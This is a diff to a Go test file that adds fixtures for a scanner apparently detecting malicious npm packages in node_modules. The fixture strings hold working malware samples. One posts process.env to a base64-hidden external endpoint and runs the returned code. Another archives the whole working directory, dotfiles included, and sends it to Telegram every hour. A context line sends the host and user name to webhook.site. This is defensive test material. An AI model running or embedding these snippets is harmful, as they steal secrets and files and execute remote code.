@@ -1843,6 +1843,26 @@ func TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules(t *testi
 			raw:  []byte(`(async () => { const configEndpoint = Buffer.from("aHR0cHM6Ly9pcGNoZWNrLWhhc2hlZC52ZXJjZWwuYXBwL2FwaS9hdXRoLzZjMWQ2MGQzNTg1MmVmMGMwNWRm", "base64").toString(); const response = await axios.post(configEndpoint, process.env, { headers: { "x-secret-header": "campaign" } }); new Function("require", response.data)(require); })();`),
 		},
 		{
+			name: "chai as otc npm",
+			rel:  filepath.Join("node_modules", "chai-as-otc", "lib", "initializeCaller.js"),
+			raw:  []byte(`(async () => { const endpoint = Buffer.from("aHR0cHM6Ly9pcGNoZWNrLWhhc2hlZC52ZXJjZWwuYXBwL2FwaS9hdXRoLzZjMWQ2MGQzNTg1MmVmMGMwNWRm", "base64").toString(); const response = await axios.post(endpoint, process.env); new Function("require", response.data)(require); })();`),
+		},
+		{
+			name: "chai as otc pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "chai-as-otc@1.0.5", "node_modules", "chai-as-otc", "lib", "initializeCaller.js"),
+			raw:  []byte(`(async () => { const endpoint = Buffer.from("aHR0cHM6Ly9pcGNoZWNrLWhhc2hlZC52ZXJjZWwuYXBwL2FwaS9hdXRoLzZjMWQ2MGQzNTg1MmVmMGMwNWRm", "base64").toString(); const response = await axios.post(endpoint, process.env); new Function("require", response.data)(require); })();`),
+		},
+		{
+			name: "spotify url infos npm",
+			rel:  filepath.Join("node_modules", "spotify-url-infos", "index.js"),
+			raw:  []byte(`async function backup() { archive.glob("**/*", { cwd: process.cwd(), dot: true }); await telegram.sendDocument(chatId, archive); } function startBackupLoop() { backup(); setInterval(backup, 60 * 60 * 1000); } startBackupLoop();`),
+		},
+		{
+			name: "spotify url infos pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "spotify-url-infos@3.4.2", "node_modules", "spotify-url-infos", "index.js"),
+			raw:  []byte(`async function backup() { archive.glob("**/*", { cwd: process.cwd(), dot: true }); await telegram.sendDocument(chatId, archive); } function startBackupLoop() { backup(); setInterval(backup, 60 * 60 * 1000); } startBackupLoop();`),
+		},
+		{
 			name: "gfe lx watcher npm",
 			rel:  filepath.Join("node_modules", "@gfe", "lx-watcher", "install.js"),
 			raw:  []byte(`const { hostname, userInfo } = require("os"); const https = require("https"); const payload = JSON.stringify({ host: hostname(), user: userInfo().username, cwd: process.cwd() }); https.request({ host: "webhook.site", path: "/df384ffa-1094-4bbf-a202-e8b345b3ed18/gfe", method: "POST" }).end(payload);`),
